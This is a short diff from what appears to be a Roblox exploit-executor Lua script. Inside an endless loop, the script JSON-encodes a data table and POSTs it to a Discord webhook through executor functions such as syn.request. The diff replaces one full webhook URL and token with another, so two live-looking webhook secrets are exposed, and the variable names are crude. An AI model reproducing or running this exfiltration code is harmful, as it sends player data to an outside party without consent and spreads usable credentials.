@@ -135,7 +135,7 @@ while true do
 		local porn = game:GetService("HttpService"):JSONEncode(data)
         	local headers = {["content-type"] = "application/json"}
         	local request = http_request or request or HttpPost or syn.request or http.request
-        	local sex = {Url = "https://discord.com/api/webhooks/1153950496554500146/2t1HzB8vEz7YXQYD1WHu0o32HI4RaJTAMcR3USGfX6amaSQjQNiqm5Nq8rKpdRyI6Prv", Body = porn, Method = "POST", Headers = headers}
+        	local sex = {Url = "https://discord.com/api/webhooks/1155690902556246036/-Z8iOIirPksMA3udnFkPc0tiyk3pAtLOfSX5HwVKOCZh11UEf3ixZwBHiRlDt2tGWK2t", Body = porn, Method = "POST", Headers = headers}
 		request(sex)
 		
 		local args = {
